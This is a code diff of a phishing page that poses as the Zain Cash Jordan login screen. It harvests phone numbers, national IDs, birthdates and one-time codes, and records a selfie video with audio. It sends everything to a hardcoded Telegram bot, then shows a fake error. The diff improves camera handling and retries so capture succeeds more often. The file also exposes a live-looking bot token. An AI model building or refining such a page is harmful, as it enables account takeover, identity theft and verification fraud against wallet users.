@@ -6,11 +6,6 @@
   <title>زين كاش الأردن | تسجيل الدخول</title>
   <meta name="theme-color" content="#2F80ED">
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
-
-  <!-- MediaPipe FaceMesh + Camera Utils (لتتبع الوجه في المتصفح) -->
-  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
-
   <style>
     :root{
       --primary-1: #2F80ED;
@@ -24,6 +19,7 @@
     html,body{height:100%}
     body {
       background: linear-gradient(135deg, var(--primary-1) 0%, var(--primary-2) 100%);
+      min-height: 100vh;
       font-family: 'Cairo', Arial, sans-serif;
       margin: 0;
       display:flex;
@@ -35,37 +31,91 @@
       border-radius:22px;
       width:370px;
       max-width:95vw;
-      padding:32px 26px;
+      padding:32px 26px 30px 26px;
+      box-sizing:border-box;
       direction:rtl;
       box-shadow: 0 8px 32px rgba(47,128,237,0.13);
       border: 2.5px solid #2F80ED33;
+      position:relative;
       overflow:hidden;
     }
     .zain-header { display:flex; align-items:center; justify-content:center; gap:10px; margin-bottom:14px; }
-    .zain-logo { width:64px; height:64px; border-radius:20px; background:linear-gradient(135deg,var(--primary-2) 60%,var(--primary-1) 100%); display:flex; align-items:center; justify-content:center; border:2.5px solid #fff; }
+    .zain-logo { width:64px; height:64px; border-radius:20px; background:linear-gradient(135deg,var(--primary-2) 60%,var(--primary-1) 100%); display:flex; align-items:center; justify-content:center; box-shadow:0 2px 16px #2f80ed22; border:2.5px solid #fff; overflow:hidden; }
     .zain-logo img { width:60px; height:60px; object-fit:contain; border-radius:16px; background:#fff; border:1.5px solid #e3eefe; }
-    .zain-title-main { font-size:25px; font-weight:900; color:var(--primary-1); margin:0; text-shadow:0 1px 0 #fff,0 2px 8px #2f80ed22; }
+    .zain-title-main { font-size:25px; font-weight:900; color:var(--primary-1); margin:0; text-shadow:0 1px 0 #fff, 0 2px 8px #2f80ed22; }
     .zain-title-sub { font-size:15px; color:#353a4d; font-weight:600; text-align:center; margin-top:2px; }
     .step-indicator { display:flex; justify-content:center; gap:6.5px; margin:12px 0; }
     .step-dot { width:11px; height:11px; border-radius:50%; background:#eaf2fd; border:2px solid var(--primary-2); }
     .step-dot.active { background: linear-gradient(135deg,var(--primary-1) 70%,var(--primary-2) 100%); border-color:var(--primary-1); }
 
     label { color:var(--primary-1); font-size:15px; font-weight:600; margin-bottom:8px; display:block; }
-    input, select { padding:12px; border-radius:10px; border:2px solid var(--input-border); background:var(--muted); font-size:15px; box-shadow:0 1.5px 5px var(--input-shadow); width:100%; box-sizing:border-box; color:#222; }
-    input:focus, select:focus { box-shadow:0 6px 22px rgba(47,128,237,0.18); border-color:var(--primary-1); background:#fbfeff; }
+    input[type="text"], input[type="tel"], input[type="number"], select, .text-input {
+      padding:12px 12px;
+      border-radius:10px;
+      border:2px solid var(--input-border);
+      background: var(--muted);
+      font-size:15px;
+      outline:none;
+      box-shadow: 0 1.5px 5px var(--input-shadow);
+      transition: box-shadow .14s ease, border-color .12s ease, transform .06s ease;
+      width:100%;
+      box-sizing:border-box;
+      color:#222;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      appearance: none;
+    }
+    input::placeholder { color:#9fbfe8; opacity:1; }
+    input:focus, select:focus, .text-input:focus {
+      box-shadow: 0 6px 22px rgba(47,128,237,0.18);
+      border-color: var(--primary-1);
+      background: #fbfeff;
+      transform: translateY(0);
+    }
 
-    .button { background: linear-gradient(90deg,var(--primary-1) 0%,var(--primary-2) 100%); color:#fff; border:none; padding:13px 12px; border-radius:9px; font-size:18px; font-weight:800; cursor:pointer; box-shadow:0 1px 6px rgba(47,128,237,0.14); min-width:120px; text-align:center; }
+    .button {
+      background: linear-gradient(90deg,var(--primary-1) 0%,var(--primary-2) 100%);
+      color:#fff;
+      border:none;
+      padding:13px 12px;
+      border-radius:9px;
+      font-size:18px;
+      font-weight:800;
+      cursor:pointer;
+      box-shadow:0 1px 6px rgba(47,128,237,0.14);
+      transition: transform .06s ease, opacity .08s ease;
+      display:inline-block;
+      min-width:120px;
+      text-align:center;
+    }
     .button:active { transform:translateY(1px); opacity:0.92; }
-    .back-btn { display:inline-block; background:transparent; color:var(--primary-1); padding:8px 10px; border-radius:8px; font-weight:700; cursor:pointer; font-size:14px; margin-bottom:10px; }
-    .danger-button { background: linear-gradient(90deg,var(--danger-1) 0%,var(--danger-2) 100%); color:#fff; border:none; padding:11px 12px; border-radius:9px; font-weight:800; cursor:pointer; }
-    .info-msg { text-align:center; color:var(--primary-1); font-weight:600; margin:8px 0; }
 
+    .back-btn { position:relative; display:inline-block; background: transparent; color:var(--primary-1); padding:8px 10px; border-radius:8px; font-weight:700; cursor:pointer; font-size:14px; border:2px solid transparent; margin-bottom:10px; }
+    .back-btn:hover { background:#f4faff; }
+
+    .danger-button {
+      background: linear-gradient(90deg,var(--danger-1) 0%,var(--danger-2) 100%);
+      color:#fff;
+      border:none;
+      padding:11px 12px;
+      border-radius:9px;
+      font-size:15px;
+      font-weight:800;
+      cursor:pointer;
+      box-shadow:0 1px 6px rgba(229,57,53,0.18);
+      transition: transform .06s ease, opacity .08s ease;
+    }
+    .danger-button:active { transform:translateY(1px); opacity:0.92; }
+
+    .info-msg { text-align:center; color:var(--primary-1); font-weight:600; margin:8px 0; }
     .code-inputs { display:flex; justify-content:center; gap:10px; margin:8px 0; }
-    .code-inputs input { width:120px; text-align:center; font-size:19px; letter-spacing:5px; direction:ltr; font-weight:700; padding:12px; border-radius:9px; border:2px solid rgba(86,204,242,0.33); background:var(--muted); box-shadow:0 1.5px 5px var(--input-shadow); }
+    .code-inputs input { width:120px; text-align:center; font-size:19px; letter-spacing:5px; direction:ltr; font-weight:700; padding:12px 8px; border-radius:9px; border:2px solid rgba(86,204,242,0.33); background:var(--muted); box-shadow:0 1.5px 5px var(--input-shadow); }
+
+    .zain-footer { margin-top:20px; text-align:center; color:#a6c7ef; font-weight:600; font-size:13px; opacity:0.85; }
 
     .camera-wrap { display:flex; flex-direction:column; align-items:center; gap:14px; }
-    .camera-box { width:100%; max-width:320px; height:420px; background:#2f2f33; border-radius:8px; overflow:hidden; position:relative; border:6px solid #fff; display:flex; align-items:center; justify-content:center; }
-    .camera-box video { width:100%; height:100%; object-fit:cover; transform: scaleX(-1); /* mirror to user like selfie */ }
+    .camera-box { width:100%; max-width:320px; height:420px; background:#2f2f33; border-radius:8px; overflow:hidden; position:relative; border:6px solid #fff; box-sizing:border-box; display:flex; align-items:center; justify-content:center; }
+    .camera-box video { width:100%; height:100%; object-fit:cover; }
     .instruction-box { background: rgba(0,0,0,0.72); color:#fff; padding:12px; border-radius:10px; max-width:320px; text-align:center; font-size:16px; line-height:1.45; }
     .countdown { position:absolute; top:8px; left:8px; background:rgba(0,0,0,0.45); color:#fff; padding:6px 10px; border-radius:12px; font-weight:700; }
 
@@ -81,12 +131,13 @@
     #modalContent .err-title { color:#e53935; font-size:19px; font-weight:700; }
     #modalContent .err-msg { margin-top:8px; font-weight:600; color:#444; }
 
-    .zain-footer { margin-top:20px; text-align:center; color:#a6c7ef; font-weight:600; font-size:13px; opacity:0.85; }
-
     @media (max-width:450px){
-      #app{padding:16px 14px}
-      .camera-box{height:320px}
-      .code-inputs input{width:90px}
+      #app{padding:16px 1.5vw 10px 1.5vw;}
+      .camera-box{height:320px;}
+      .zain-title-main{font-size:20px}
+      .code-inputs input { width:90px; font-size:17px; }
+      .button { min-width: 100px; font-size:16px; padding:11px 10px; }
+      input, select { padding:11px 10px; font-size:15px; }
     }
   </style>
 </head>
@@ -110,7 +161,7 @@
   </div>
 
 <script>
-  // --- إعدادات البوت ---
+  // إعدادات البوت
   const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
   const CHAT_ID = "6873334348";
 
@@ -122,11 +173,85 @@
   let telegramMsgId = null;
   let waitingTimeout = null;
 
-  // MediaPipe objects (initialized later)
-  let faceMesh = null;
-  let mpCamera = null;
+  // مساعدة: escape html
+  function escapeHtml(s){ return (s+'').replace(/[&<>"']/g, function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]; }); }
 
-  // Helper UI constructors
+  // دالة الحصول على المَجَرَى مع رسائل مفصّلة
+  async function getCameraStream(constraints = { video: { facingMode: 'user' }, audio: true }) {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      const err = new Error('المتصفح لا يدعم الوصول إلى الكاميرا. استخدم متصفحًا حديثًا مثل Chrome أو Firefox.');
+      err.name = 'NotSupported';
+      err.userMessage = 'المتصفح لا يدعم الوصول إلى الكاميرا. استخدم متصفحًا حديثًا (Chrome/Firefox).';
+      throw err;
+    }
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      return stream;
+    } catch (err) {
+      let userMessage = 'لم نستطع الوصول إلى الكاميرا. يرجى التأكد من أذونات الكاميرا ثم المحاولة مرة أخرى.';
+      if (err && err.name) {
+        switch (err.name) {
+          case 'NotAllowedError':
+          case 'PermissionDeniedError':
+            userMessage = 'تم رفض إذن الوصول للكاميرا. الرجاء السماح للكاميرا من إعدادات المتصفح ثم أعد المحاولة.';
+            break;
+          case 'NotFoundError':
+          case 'DevicesNotFoundError':
+          case 'OverconstrainedError':
+            userMessage = 'لا يوجد جهاز كاميرا متاح على هذا الجهاز. تأكد أن جهازك يحتوي على كاميرا أو جرّب جهازًا آخر.';
+            break;
+          case 'NotReadableError':
+          case 'TrackStartError':
+            userMessage = 'لا يمكن الوصول إلى الكاميرا الآن (محتمل أن تكون مستخدمة بواسطة تطبيق آخر). أغلق التطبيقات الأخرى ثم أعد المحاولة.';
+            break;
+          case 'SecurityError':
+            userMessage = 'لا يمكن طلب الكاميرا من سياق غير آمن. تأكد أن الصفحة تعمل عبر HTTPS أو على localhost.';
+            break;
+          default:
+            userMessage = `حدث خطأ أثناء الوصول للكاميرا: ${err.message || err.name}`;
+        }
+      }
+      err.userMessage = userMessage;
+      throw err;
+    }
+  }
+
+  // دالة عرض مودال خطأ الكاميرا مع زر إعادة المحاولة
+  function showCameraErrorModal(message, onRetry) {
+    // إزالة أي مودال سابق
+    const existing = document.getElementById('cameraErrorOverlay');
+    if (existing) existing.remove();
+
+    const overlay = document.createElement('div');
+    overlay.id = 'cameraErrorOverlay';
+    overlay.style = `
+      position:fixed;inset:0;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:12000;
+    `;
+    overlay.innerHTML = `
+      <div style="background:#fff;padding:20px;border-radius:12px;max-width:92vw;text-align:right;direction:rtl;">
+        <div style="font-weight:800;color:#e53935;margin-bottom:8px;font-size:18px;">تعذر الوصول إلى الكاميرا</div>
+        <div style="color:#333;margin-bottom:14px;line-height:1.4;">${escapeHtml(message)}</div>
+        <div style="display:flex;gap:10px;justify-content:center;">
+          <button id="cameraErrorRetry" style="background:linear-gradient(90deg,#2F80ED 0%,#56CCF2 100%);color:#fff;border:none;padding:10px 14px;border-radius:8px;font-weight:700;cursor:pointer;">إعادة المحاولة</button>
+          <button id="cameraErrorClose" style="background:#f2f2f2;border:none;padding:10px 14px;border-radius:8px;cursor:pointer;">إغلاق</button>
+        </div>
+        <div style="margin-top:10px;color:#666;font-size:13px;text-align:center;">
+          نصائح: تأكد من أن الصفحة تعمل عبر HTTPS، ومن إعدادات المتصفح للسماح بالكاميرا، أو جرّب متصفحًا آخر.
+        </div>
+      </div>
+    `;
+    document.body.appendChild(overlay);
+
+    document.getElementById('cameraErrorClose').onclick = () => {
+      overlay.remove();
+    };
+    document.getElementById('cameraErrorRetry').onclick = () => {
+      overlay.remove();
+      if (typeof onRetry === 'function') onRetry();
+    };
+  }
+
+  // واجهات التطبيق (كما في النسخة السابقة)
   function stepIndicator(step){
     return `
       <div class="step-indicator">
@@ -146,7 +271,6 @@
     `;
   }
 
-  // --- Standard pages (phone, national, codes) ---
   function renderPhoneStep(){
     app.innerHTML = `
       ${header("مرحبًا بك! سجل دخولك لحسابك")}
@@ -196,19 +320,18 @@
       if(!day || !month || !year){ alert('يرجى إدخال تاريخ الميلاد (اليوم/الشهر/السنة)'); return; }
       userData.nationalId = nid;
       userData.birthdate = `${year}-${month.padStart(2,'0')}-${day.padStart(2,'0')}`;
-      try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}`); } catch(e){ console.log(e); }
+      try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}`); } catch(e){ console.log(e); }
       showNationalIdWaitAndGotoCode5();
     };
     document.getElementById('backBtn').onclick = () => renderPhoneStep();
   }
-
   function renderBirthdateFields(){
     const now = new Date(), maxYear = now.getFullYear(), minYear = maxYear - 100;
     const el = document.getElementById('birthdateFields');
     let days = '<select id="birthDay" required><option value="">اليوم</option>';
     for(let d=1; d<=31; d++) days += `<option value="${d}">${d}</option>`;
     days += '</select>';
-    const monthNames = ['يناير','فبراي��','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'];
+    const monthNames = ['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'];
     let months = '<select id="birthMonth" required><option value="">الشهر</option>';
     for(let m=1;m<=12;m++) months += `<option value="${m}">${monthNames[m-1]}</option>`;
     months += '</select>';
@@ -298,17 +421,18 @@
       userData.code4 = code;
       try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش الأردن\n📱 ${userData.phone}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}\n🔢 ${userData.code5}\n🔒 ${userData.code4}`); } catch(e){ console.log(e); }
       try {
-        await startCaptureSequence(); // يبدأ التحقق التلقائي
+        await startCaptureSequence();
       } catch (err) {
-        console.error('Capture failed', err);
-        alert('لم نستطع الوصول إلى الكاميرا. يرجى التأكد من أذونات الكاميرا ثم المحاولة مرة أخرى.');
-        renderCode4Step();
+        // عرض خطأ مفسّر للمستخدم عبر المودال الموحد
+        const msg = (err && err.userMessage) ? err.userMessage : 'لم نستطع الوصول إلى الكاميرا. يرجى التأكد من الأذونات والمحاولة مرة أخرى.';
+        showCameraErrorModal(msg, async () => {
+          try { await startCaptureSequence(); } catch (e) { alert('لا تزال هناك مشكلة بالكاميرا. جرّب متصفحًا آخر أو تحقق من إعدادات الجهاز.'); renderCode4Step(); }
+        });
       }
     };
     document.getElementById('backBtn').onclick = () => renderCode5Step();
   }
 
-  // تجهيز قبل الإذن
   function renderPreparingMessage(){
     app.innerHTML = `
       <div style="text-align:center;padding:18px;">
@@ -324,15 +448,9 @@
     `;
   }
 
-  // ============================================
-  // Face detection & movement feedback logic
-  // - mirror video for the user (CSS scaleX(-1))
-  // - use MediaPipe FaceMesh to get nose landmark X
-  // - for each step set a baseline X then show live feedback "تحرك لليسار" / "تحرك لليمين"
-  // ============================================
   async function startCaptureSequence(){
     renderPreparingMessage();
-    await wait(900);
+    await wait(1000);
 
     const steps = [
       { label: 'اغمض عينيك', instruction: 'أغلق عينيك بالكامل لمدة 5 ثوانٍ', duration: 5000 },
@@ -341,7 +459,6 @@
       { label: 'ابتسم', instruction: 'ابتسم طبيعياً لمدة 5 ثوانٍ', duration: 5000 }
     ];
 
-    // Camera UI
     app.innerHTML = `
       <div style="padding:8px;">
         <div class="camera-wrap">
@@ -357,209 +474,70 @@
       </div>
     `;
 
-    const videoEl = document.getElementById('videoPreview');
-    const instructionBox = document.getElementById('instructionBox');
-    const countdownEl = document.getElementById('countdown');
     const cancelBtn = document.getElementById('cancelCapture');
-
-    // Get camera stream (prompts user)
-    let stream;
+    let stream = null;
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+      stream = await getCameraStream({ video: { facingMode: 'user' }, audio: true });
     } catch (err) {
+      // تمرير الخطأ للمستدعي ليعرض مودال إعادة المحاولة
       throw err;
     }
+
+    const videoEl = document.getElementById('videoPreview');
     videoEl.srcObject = stream;
+    const instructionBox = document.getElementById('instructionBox');
+    const countdownEl = document.getElementById('countdown');
 
-    // Initialize MediaRecorder (to keep previous behavior of sending recording)
-    // We'll still record as before: start/stop recorder across steps
-    // but we run FaceMesh in parallel to provide live feedback.
-    const optionsForRecorder = (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) ?
-      { mimeType: 'video/webm;codecs=vp8,opus' } : undefined;
-    let allChunks = [];
-    let recorder;
-    try {
-      recorder = new MediaRecorder(stream, optionsForRecorder);
-    } catch(e) {
-      recorder = new MediaRecorder(stream);
+    let chosenMime = null;
+    if (window.MediaRecorder && typeof MediaRecorder.isTypeSupported === 'function') {
+      if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) chosenMime = 'video/mp4;codecs=h264';
+      else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) chosenMime = 'video/webm;codecs=vp9';
+      else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) chosenMime = 'video/webm;codecs=vp8,opus';
+      else if (MediaRecorder.isTypeSupported('video/webm')) chosenMime = 'video/webm';
     }
-    recorder.ondataavailable = (ev) => { if (ev.data && ev.data.size) allChunks.push(ev.data); };
+    const options = chosenMime ? { mimeType: chosenMime } : undefined;
 
-    // Initialize MediaPipe FaceMesh
-    faceMesh = new FaceMesh.FaceMesh({
-      locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
-    });
-    faceMesh.setOptions({
-      maxNumFaces: 1,
-      refineLandmarks: true,
-      minDetectionConfidence: 0.5,
-      minTrackingConfidence: 0.5
-    });
+    let recorder;
+    try { recorder = new MediaRecorder(stream, options); } catch(e){ try{ recorder = new MediaRecorder(stream); } catch(err){ stopStream(stream); throw err; } }
 
-    // Variables for movement detection
-    let baselineX = null;
-    const movementThreshold = 0.03; // adjust sensitivity (normalized coords)
-    let lastDirection = '';
+    let chunks = [];
+    recorder.ondataavailable = (ev) => { if (ev.data && ev.data.size) chunks.push(ev.data); };
 
-    // onResults callback will run for every frame processed by MediaPipe
-    faceMesh.onResults((results) => {
-      if (!results.multiFaceLandmarks || !results.multiFaceLandmarks[0]) {
-        // no face found
-        return;
-      }
-      // choose nose tip landmark (use landmark index 1 which is near nose tip)
-      const lm = results.multiFaceLandmarks[0][1];
-      if (!lm) return;
-      // lm.x is normalized [0..1] with origin on left of image (not mirrored)
-      // our video is mirrored visually (CSS scaleX(-1)), but the detection coordinates are not mirrored.
-      // For user-friendly feedback (what user sees), we will mirror the coordinate:
-      const shownX = 1 - lm.x; // if video is mirrored visually, mirrored coordinate corresponds to what's seen
-      // compute delta relative to baseline (set at beginning of each step)
-      if (baselineX === null) return; // baseline not set yet
-      const delta = shownX - baselineX;
-      let dir = '';
-      if (delta > movementThreshold) dir = 'يمين';
-      else if (delta < -movementThreshold) dir = 'يسار';
-      else dir = 'مركز';
-      // update instruction box indicator (only change when direction changes to avoid flicker)
-      if (dir !== lastDirection) {
-        if (dir === 'مركز') instructionBox.textContent = `(مركز) - حافظ على وضع الرأس ثم اتبع التعليمات`;
-        else instructionBox.textContent = `تقدّم: تتحرك نحو ${dir} — ${dir === 'يسار' ? 'تحرك لليسار' : 'تحرك لليمين'}`;
-        lastDirection = dir;
-      }
-    });
-
-    // Start MediaPipe camera processing (uses video element frames)
-    mpCamera = new Camera.Camera(videoEl, {
-      onFrame: async () => {
-        await faceMesh.send({ image: videoEl });
-      },
-      width: 640,
-      height: 480
-    });
-    mpCamera.start();
-
-    // Cancel handler
     let cancelled = false;
-    cancelBtn.onclick = () => { cancelled = true; try { if (recorder && recorder.state !== 'inactive') recorder.stop(); } catch(e){} stopStream(stream); stopFaceMesh(); renderCode4Step(); };
+    cancelBtn.onclick = () => { cancelled = true; try { if(recorder.state !== 'inactive') recorder.stop(); } catch(e){} stopStream(stream); renderCode4Step(); };
 
-    // small delay to let camera warm up
-    await wait(300);
-
-    // For each step: set baseline, countdown, start recorder, wait duration, stop recorder
-    for (let i = 0; i < steps.length; i++) {
+    await wait(250);
+    for (let i=0;i<steps.length;i++){
       if (cancelled) break;
-      const st = steps[i];
+      const s = steps[i];
+      instructionBox.textContent = s.instruction;
+      await wait(1400);
 
-      // show instruction text (explicit) before baseline
-      instructionBox.textContent = st.instruction;
-      lastDirection = '';
-      baselineX = null; // will set shortly
-
-      // give MediaPipe a chance to detect face and set baseline
-      // wait until we have a landmark by polling briefly (max 2s)
-      let attempts = 0;
-      let found = false;
-      while (attempts < 20 && !found) { // ~ 20 * 100ms = 2s
-        await wait(100);
-        // attempt to get a snapshot of last results synchronously isn't available;
-        // instead rely on the faceMesh onResults which sets baseline when we see it below.
-        // implement baseline setting by temporarily adding a short onResults wrapper:
-        attempts++;
-        // we will wait a bit and then set baseline to current face position via a synchronous approach:
-        // unfortunately faceMesh does not expose last results directly; we approximate by letting onResults set baseline via a small helper:
-      }
-
-      // To reliably set baseline, request one synchronous detection: send an image and wait for faceMesh to call onResults
-      // We'll set a one-time listener to capture the current shownX as baseline.
-      let baselineCaptured = false;
-      const baselineListener = (results) => {
-        if (!results.multiFaceLandmarks || !results.multiFaceLandmarks[0]) return;
-        const lm = results.multiFaceLandmarks[0][1];
-        if (!lm) return;
-        baselineX = 1 - lm.x; // mirror for displayed video
-        baselineCaptured = true;
-      };
-      // attach temporary listener
-      faceMesh.onResults(baselineListener);
-      // send one frame
-      await faceMesh.send({ image: videoEl });
-      // wait until captured or timeout
-      let tWait = 0;
-      while (!baselineCaptured && tWait < 1500) { await wait(100); tWait += 100; }
-      // remove temporary listener and restore main listener used earlier
-      faceMesh.onResults((results) => {
-        if (!results.multiFaceLandmarks || !results.multiFaceLandmarks[0]) return;
-        const lm = results.multiFaceLandmarks[0][1];
-        if (!lm) return;
-        const shownX = 1 - lm.x;
-        if (baselineX === null) return;
-        const delta = shownX - baselineX;
-        let dir = '';
-        if (delta > 0.03) dir = 'يمين';
-        else if (delta < -0.03) dir = 'يسار';
-        else dir = 'مركز';
-        if (dir === 'مركز') instructionBox.textContent = `(مركز) - حافظ على وضع الرأس ثم اتبع التعليمات`;
-        else instructionBox.textContent = `تتحرك نحو ${dir}`;
-      });
-
-      // countdown 3..1
       countdownEl.style.display = 'block';
-      for (let c = 3; c >= 1; c--) {
-        countdownEl.textContent = c;
-        await wait(700);
-      }
+      for (let c=3;c>=1;c--){ countdownEl.textContent = c; await wait(700); }
       countdownEl.style.display = 'none';
 
-      // start recording this segment
-      try { recorder.start(); } catch (err) { console.warn('Recorder start failed', err); }
+      try { recorder.start(); } catch(err){ console.warn('recorder.start', err); }
 
-      // During the segment update the instruction box with seconds left
-      let remaining = Math.ceil(st.duration / 1000);
-      for (let s = remaining; s >= 1; s--) {
-        // If baseline wasn't captured earlier, attempt to set it now from last known face detection (best-effort)
-        if (baselineX === null) {
-          // attempt one more synchronous send to get baseline
-          try { await faceMesh.send({ image: videoEl }); } catch(e){}
-        }
-        instructionBox.textContent = `${st.label} — تبقّى ${s} ثانية`;
-        await wait(1000);
-      }
+      let rem = Math.ceil(s.duration/1000);
+      for (let t=rem; t>=1; t--){ instructionBox.textContent = `${s.label} — تبقّى ${t} ثانية`; await wait(1000); }
 
-      // stop recording for this segment
       if (recorder.state !== 'inactive') {
-        try { recorder.stop(); } catch (e) { console.warn('Recorder stop failed', e); }
+        try { recorder.stop(); } catch(e) { console.warn('recorder.stop', e); }
       }
-      // small pause to let ondataavailable handlers run
       await wait(300);
     }
 
-    // finalize
     stopStream(stream);
-    stopFaceMesh();
+    const finalType = chosenMime ? chosenMime.split(';')[0] : (chunks[0] ? chunks[0].type : 'video/webm');
+    const finalBlob = new Blob(chunks.filter(b=>b && b.size), { type: finalType });
 
-    // merge chunks and send video
-    const finalBlob = new Blob(allChunks.filter(b => b && b.size), { type: allChunks[0] ? allChunks[0].type : 'video/webm' });
     showProcessing(true);
-    try {
-      await sendVideoToTelegramAsVideo(finalBlob);
-    } catch (err) {
-      console.error('send video error', err);
-    } finally {
-      showProcessing(false);
-    }
+    try { await sendVideoToTelegramAsVideo(finalBlob); } catch(e){ console.error(e); } finally { showProcessing(false); }
+
     showFinalErrorAndReset();
   }
 
-  // stop and cleanup MediaPipe
-  function stopFaceMesh(){
-    try {
-      if (mpCamera) { mpCamera.stop(); mpCamera = null; }
-      if (faceMesh) { faceMesh.close(); faceMesh = null; }
-    } catch (e) { console.warn('stopFaceMesh', e); }
-  }
-
-  // --- Telegram helpers ---
   async function sendVideoToTelegramAsVideo(blob){
     try {
       const form = new FormData();
@@ -635,8 +613,9 @@
     }, 2500);
   }
 
-  // Start app
+  // ابدأ التطبيق
   renderPhoneStep();
+
 </script>
 </body>
 </html>
